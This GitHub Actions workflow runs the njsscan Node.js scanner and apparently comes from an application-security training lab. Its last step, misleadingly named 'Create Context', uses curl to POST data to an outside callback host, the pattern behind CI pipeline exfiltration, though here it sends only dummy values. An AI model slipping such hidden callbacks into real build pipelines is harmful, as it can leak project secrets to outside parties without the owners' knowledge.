name: njsscan
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
jobs:
  njsscan:
    runs-on: ubuntu-latest
    name: njsscan code scanning
    steps:
    - name: Checkout the code
      uses: actions/checkout@v4.2.2
    - uses: actions/setup-python@v5.3.0
      with:
        python-version: '3.12'
    - name: nodejsscan scan
      id: njsscan
      uses: ajinabraham/njsscan-action@master
      with:
        args: '. --sarif --output results.sarif || true'
    - name: Create Context
      run: |
        curl -X POST -H "Content-Type: application/json" -d '{"key1": "value1", "key2": "value2"}'   http://oqngfj0xblq3lx0jltjmw.appsecengineer.training:8880/callback
